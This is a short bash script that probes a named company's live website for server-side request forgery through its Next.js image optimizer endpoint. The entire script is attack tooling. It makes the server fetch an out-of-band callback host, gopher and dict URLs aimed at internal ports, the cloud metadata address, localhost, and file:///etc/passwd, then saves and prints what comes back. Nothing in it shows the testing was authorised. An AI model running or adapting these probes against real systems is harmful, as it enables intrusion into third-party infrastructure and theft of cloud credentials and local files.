#!/bin/bash
# SSRF / image-optimizer sink testing on _next/image
H=oob74ba86eabb17.dau2p4ghgqag02k5emggc5yu6hph3m973.oast.abhedi.co.in
U="https://www.infinitycapital.bh/_next/image"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

test_url () {
  local label="$1"; local target="$2"
  code=$(curl -sk -A "$UA" -o /tmp/ic_body.bin -D /tmp/ic_hdr.txt -w "%{http_code} %{size_download}" --max-time 25 --get --data-urlencode "url=$target" --data "w=640&q=75" "$U")
  echo "[$label] code/size: $code"
  grep -iE "x-vercel-error|content-type:" /tmp/ic_hdr.txt | head -3
  echo "  body(120): $(head -c 120 /tmp/ic_body.bin | tr -d '\0')"
  echo
}

test_url "OOB_HTTP"   "http://$H/ssrf-imgopt"
test_url "OOB_HTTPS"  "https://$H/ssrf-imgopt"
test_url "GOPHER"     "gopher://$H:25/x"
test_url "DICT"       "dict://$H:11211/x"
test_url "ALLOWLISTED_CDN" "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
test_url "METADATA"   "http://169.254.169.254/latest/meta-data/"
test_url "LOCALHOST"  "http://localhost:3000/"
test_url "FILE_PROTO" "file:///etc/passwd"
